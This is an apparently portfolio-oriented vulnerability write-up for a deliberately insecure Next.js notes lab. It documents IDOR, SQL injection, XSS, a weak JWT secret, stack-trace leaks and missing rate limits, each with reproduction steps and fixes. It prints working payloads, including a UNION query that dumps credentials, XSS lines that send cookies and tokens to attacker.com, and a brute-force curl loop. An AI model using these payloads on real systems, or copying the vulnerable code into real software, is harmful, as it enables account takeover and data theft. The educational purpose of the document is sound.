# VULNERABILITIES.md

> **VULNLAB** — Intentionally Vulnerable Web Application  
> Documented vulnerabilities for educational and portfolio purposes.  
> All vulnerabilities are **intentional** and exist only in this local lab environment.

---

## Summary

| # | Vulnerability | OWASP Category | Severity | Location |
|---|--------------|----------------|----------|----------|
| 1 | Insecure Direct Object Reference (IDOR) | A01 Broken Access Control | 🔴 High | `/api/notes/:id` |
| 2 | SQL Injection | A03 Injection | 🔴 High | `/api/search` |
| 3 | Cross-Site Scripting (XSS) | A03 Injection | 🟠 Medium | Note content field |
| 4 | Broken Access Control | A01 Broken Access Control | 🟠 Medium | `/api/users/:id` |
| 5 | Cryptographic Failures (Weak JWT Secret) | A02 Cryptographic Failures | 🟠 Medium | `lib/auth.js`, localStorage |
| 6 | Security Misconfiguration (Stack Trace Exposure) | A05 Security Misconfiguration | 🟡 Low | All API error responses |
| 7 | Identification & Auth Failures (No Rate Limit) | A07 Auth Failures | 🟠 Medium | `POST /api/auth/login` |

---

## 1. Insecure Direct Object Reference (IDOR)

### Description
The notes API exposes internal object IDs directly in the URL and does not verify whether the authenticated user owns the requested resource. Any authenticated user can read, edit, or delete notes belonging to other users by manipulating the `id` parameter.

### Affected Endpoints
- `GET /api/notes/:id` — read any note
- `PUT /api/notes/:id` — edit any note
- `DELETE /api/notes/:id` — delete any note

### Steps to Reproduce
1. Log in as `test3`
2. Create a note — observe the `id` badge on the note card (e.g. `id:19`)
3. Log in as `test4` in a separate session and create a note (e.g. `id:27`)
4. As `test3`, send a request directly to `GET /api/notes/27`
5. The API returns `test4`'s note — including private notes

```
GET /api/notes/27
Authorization: Bearer <test3_token>

→ 200 OK  { id: 27, title: "note user4", authorId: 20, isPublic: true, ... }
```

### Evidence
- Note IDs are visibly exposed on every NoteCard (`id:XX` badge)
- API returns notes regardless of `authorId` vs token owner
- Edit and Delete actions via Thunder Client succeed on other users' notes

### Root Cause
```javascript
// api/notes/[id]/route.js — no ownership check
const note = await prisma.note.findUnique({ where: { id } })
return NextResponse.json(note)
```

### Risk
A malicious user can enumerate all notes, access private content, modify or delete other users' data.

### Remediation
```javascript
// Verify ownership before returning
if (note.authorId !== session.user.id) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
```

---

## 2. SQL Injection

### Description
The search endpoint passes user input directly into a raw SQL query using Prisma's `$queryRawUnsafe()` without any sanitization or parameterization. An attacker can manipulate the query to dump all notes, bypass filters, or extract sensitive data including user credentials.

### Affected Endpoint
- `GET /api/search?q=`

### Steps to Reproduce
1. Navigate to `/search`
2. Enter the payload: `' OR 1=1 #`
3. Click **Run** — all notes from all users are returned regardless of visibility or ownership
4. Enter the Union-based payload to extract user credentials:
```
' OR (1=0) UNION SELECT id,username,password,email,createdAt,createdAt,id FROM User --
```
5. Response includes hashed passwords and emails of all users

### Evidence
- Payload `' OR 1=1 #` returns all 9 notes including private notes from other users
- Union probe payload returns User table rows mapped into the notes response shape
- SQLi Detected banner confirms the injection on the frontend

### Root Cause
```javascript
// api/search/route.js
const results = await prisma.$queryRawUnsafe(
  `SELECT * FROM Note WHERE title LIKE '%${q}%' OR content LIKE '%${q}%'`
)
```

### Risk
Full database read access. An attacker can dump all notes, extract user credentials (username, hashed password, email), and potentially pivot to further attacks.

### Remediation
Use parameterized queries via Prisma's `$queryRaw` with tagged template literals:
```javascript
const results = await prisma.$queryRaw`
  SELECT * FROM Note
  WHERE title LIKE ${'%' + q + '%'}
  OR content LIKE ${'%' + q + '%'}
`
```
Or use the Prisma ORM query builder:
```javascript
const results = await prisma.note.findMany({
  where: {
    OR: [
      { title: { contains: q } },
      { content: { contains: q } },
    ]
  }
})
```

---

## 3. Cross-Site Scripting (XSS)

### Description
Note content is rendered using React's `dangerouslySetInnerHTML` without any sanitization. Any HTML or JavaScript injected into the content field is executed in the browser of any user who views the note. Since notes can be public, this affects all users of the application.

### Affected Components
- `NoteCard` component — note content display
- `ResultCard` component — search results display

### Steps to Reproduce
1. Log in and create a new note
2. In the **Content** field, enter:
```html
<img src=x onerror="alert('XSS by ' + document.cookie)">
```
3. Save the note
4. The alert fires immediately on the notes page for the creator
5. Since the note is public, the alert fires for **any user** who views it

**Stored XSS via cookie theft:**
```html
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>
```

### Evidence
- Alert box appears on note render with injected payload
- `dangerouslySetInnerHTML={{ __html: note.content }}` confirmed in source
- Content field placeholder reads: `Write anything... or inject <script>alert(1)</script>`

### Root Cause
```jsx
// components in notes/page.js and search/page.js
<div
  className="..."
  dangerouslySetInnerHTML={{ __html: note.content }}
/>
```

### Risk
Stored XSS affecting all users who view a public note. Potential impact includes session hijacking via cookie theft, credential phishing, and malicious redirects.

### Remediation
Sanitize HTML before rendering using a library such as DOMPurify:
```javascript
import DOMPurify from 'dompurify'

<div
  className="..."
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(note.content) }}
/>
```
Or render as plain text using a `<p>` tag instead:
```jsx
<p className="...">{note.content}</p>
```

---

## 4. Broken Access Control

### Description
The user profile endpoint accepts a user `id` from the URL query parameter (`?id=`) and returns the corresponding user's profile without verifying that the `id` matches the currently authenticated user. Any authenticated user can view — and edit — any other user's profile data by changing the `id` in the URL.

### Affected Endpoints
- `GET /api/users/:id` — view any user's profile
- `PUT /api/users/:id` — update any user's profile (IDOR on profile)

### Steps to Reproduce
1. Log in as `test3` — observe the URL becomes `/profile?id=19`
2. Manually change the URL to `/profile?id=20`
3. The page loads `test4`'s profile: username, email, user ID, join date
4. Click **Edit** and save — the API updates `test4`'s account without any authorization error

```
GET /api/users/20
Authorization: Bearer <test3_token>

→ 200 OK  { id: 20, username: "test4", email: "test4@test.com", ... }
```

### Evidence
- URL change to `?id=20` while logged in as `test3` shows `test4`'s profile
- Warning banner `⚠ Viewing profile of @test4 — not your account` confirms the exploit
- Edit + Save successfully modifies `test4`'s username and email

### Root Cause
```javascript
// api/users/[id]/route.js — id comes from URL, no auth check
const { id } = params
const user = await prisma.user.findUnique({ where: { id: parseInt(id) } })
return NextResponse.json(user)
```

### Risk
An attacker can enumerate user profiles to harvest email addresses and usernames. Combined with the Edit capability, this allows account takeover by modifying another user's credentials.

### Remediation
```javascript
// Enforce that the requested id matches the authenticated user
const session = await getServerSession()
if (parseInt(id) !== session.user.id) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
```


---

## 5. Cryptographic Failures

### Description
The application uses bcrypt for password hashing in the seed data, but the intentional vulnerability here is that the JWT secret is hardcoded as `"supersecretkey123"` in `.env`. This short, predictable string can be brute-forced offline. Any attacker who obtains this secret can forge arbitrary JWT tokens and authenticate as any user without knowing their password.

Additionally, JWT tokens are stored in `localStorage` rather than an `httpOnly` cookie, making them accessible to JavaScript — meaning any XSS payload (see VULN-03) can trivially steal the token.

### Affected Components
- `lib/auth.js` — JWT signing with weak secret
- Frontend — JWT stored in `localStorage`

### Steps to Reproduce

**Forge a JWT token:**
1. Take any valid JWT from localStorage (DevTools → Application → localStorage)
2. Decode the payload at [jwt.io](https://jwt.io)
3. Modify `id` to any other user's ID (e.g. change `id: 3` to `id: 4`)
4. Re-sign with secret `"supersecretkey123"`
5. Replace the token in localStorage
6. Refresh the page — you are now authenticated as that user

**Steal token via XSS:**
```html
<script>
  fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'))
</script>
```

### Evidence
- JWT secret confirmed as `"supersecretkey123"` hardcoded in `.env`
- Token decoded at jwt.io reveals user `id` and `username` in plain text
- Forged token accepted by all protected API endpoints

### Root Cause
```javascript
// lib/auth.js
// lib/auth.js
const generateToken = (payload) => {
  return jwt.sign(payload, process.env.JWT_SECRET || 'secret', { expiresIn: '7d' })
}
// .env
// JWT_SECRET="supersecretkey123"  ← weak, hardcoded, predictable
```

### Risk
An attacker can forge JWT tokens to impersonate any user, achieving full account takeover without any credentials. Combined with XSS, tokens can be silently stolen from active sessions.

### Remediation
```javascript
// Use a strong, randomly generated secret from environment variables
const JWT_SECRET = process.env.JWT_SECRET // e.g. 256-bit random hex

// Store tokens in httpOnly cookies instead of localStorage
res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' })
```

---

## 6. Security Misconfiguration

### Description
All API error handlers return the full error message and stack trace in the response body. In a production environment, this exposes internal file paths, dependency versions, and application logic to any attacker who can trigger an error.

### Affected Endpoints
- All API routes — any unhandled exception leaks stack trace

### Steps to Reproduce
1. Send a malformed request to any API endpoint (e.g. invalid JSON body, missing required field)
2. The response body contains:
   - `message` — the raw JavaScript error message
   - `stack` — full stack trace including file paths on the server

```http
POST /api/auth/register
Content-Type: application/json
{ "email": "test" }

HTTP/1.1 500 Internal Server Error
{
  "message": "...",
  "stack": "Error: ...\n    at /home/runner/work/vulnlab/app/backend/src/controllers/auth.controller.js:12:..."
}
```

### Evidence
- `stack` field visible in all 500 responses via DevTools Network tab
- File paths reveal project structure: `/app/backend/src/controllers/`
- Node.js version and dependency info inferred from stack frames

### Root Cause
```javascript
// All controllers — intentional exposure
} catch (error) {
  res.status(500).json({ message: error.message, stack: error.stack })
}
```

### Risk
Internal path disclosure assists attackers in understanding the application structure, identifying exploitable dependencies, and crafting more targeted attacks.

### Remediation
```javascript
// Return generic error in production, log details server-side
} catch (error) {
  console.error(error) // log internally
  const isDev = process.env.NODE_ENV === 'development'
  res.status(500).json({
    message: isDev ? error.message : 'Internal server error',
    stack: isDev ? error.stack : undefined
  })
}
```

---

## 7. Identification and Authentication Failures

### Description
The login endpoint has no rate limiting, account lockout, or brute-force protection. An attacker can make unlimited login attempts against any account. Combined with the weak JWT secret (see VULN-05), the authentication system provides minimal protection against credential-based attacks.

Additionally, failed login attempts are not logged anywhere, making it impossible to detect or alert on brute-force activity.

### Affected Endpoint
- `POST /api/auth/login`

### Steps to Reproduce

**Brute-force simulation:**
```bash
# Send 1000 login attempts — no throttling, no lockout
for i in $(seq 1 1000); do
  curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test3@test.com","password":"attempt'$i'"}'
done
```

All 1000 requests return `401 Invalid credentials` — none are blocked or delayed.

**No logging:**
- Check server logs after 1000 failed attempts — no record of the activity

### Evidence
- 1000 rapid POST requests to `/api/auth/login` all complete without any 429 response
- No rate-limit headers (`X-RateLimit-*`, `Retry-After`) present in responses
- Server logs show no failed login entries

### Root Cause
```javascript
// auth.controller.js — no rate limiting middleware
const login = async (req, res) => {
  // VULNERABILITY: ไม่มี rate limiting
  const user = await prisma.user.findUnique({ where: { email } })
  ...
}
```

### Risk
An attacker can perform automated credential stuffing or brute-force attacks against any account without restriction. The absence of logging also means there is no way to detect, alert on, or respond to such attacks.

### Remediation
```javascript
// Apply rate limiting middleware (e.g. express-rate-limit)
const rateLimit = require('express-rate-limit')

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                   // max 10 attempts per window
  message: { message: 'Too many login attempts. Try again later.' }
})

router.post('/login', loginLimiter, loginController)

// Log failed attempts
if (!isValid) {
  console.warn(`[AUTH] Failed login attempt for ${email} from ${req.ip}`)
  return res.status(401).json({ message: 'Invalid credentials' })
}
```


---

## Testing Environment

| Item | Detail |
|------|--------|
| Frontend | Next.js 15, React 19 |
| Backend | Next.js API Routes |
| Database | MySQL via Prisma ORM |
| Auth | JWT stored in localStorage |
| Test Accounts | `testuser1`, `test3`, `test4` |
| Tools Used | Chrome DevTools, Thunder Client (VS Code), manual browser testing, URL manipulation, jwt.io |

---

## Disclaimer

This application is built **intentionally vulnerable** for the purpose of learning and demonstrating common web security vulnerabilities. It must **never** be deployed to a public server. All vulnerabilities documented here exist by design and are confined to a local development environment.

---

*Documented by [Phuriphatthanachai Rattanatham](https://ctrlfaith-portfolio.vercel.app) — [GitHub](https://github.com/ctrlfaith)*
